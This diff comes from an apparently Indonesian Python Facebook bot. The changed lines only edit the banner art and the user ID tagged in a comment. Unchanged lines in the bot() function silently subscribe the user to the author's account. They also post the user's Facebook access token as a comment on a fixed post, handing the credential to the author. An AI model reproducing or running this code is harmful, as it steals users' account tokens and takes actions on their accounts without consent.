@@ -21,9 +21,9 @@ o = "\033[1;96m" # biru muda
 
 def banner():
     print("""
-\033[1;93m   ________      
+\033[1;93m   ________      _     
   / ____/ /___ ___________(_)____
- / / / / / `/ ___/ ___/ / ___/\033[1;96mCreated By
+ / / / / __ `/ ___/ ___/ / ___/\033[1;96mCreated By
 / /___/ / /_/ (__ |__ ) / /__  \033[1;96mRamdhan
 \____/_/\__,_/____/____/_/\___/\033[1;96mRamadhian
 """)
@@ -119,7 +119,7 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Orang Tertampan Didunia Adalah @[100024540287354:] ")
+	kom = ("Orang Tertampan Didunia Adalah @[100044932290784:] ")
 	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + kom + '&access_token=' + toket)
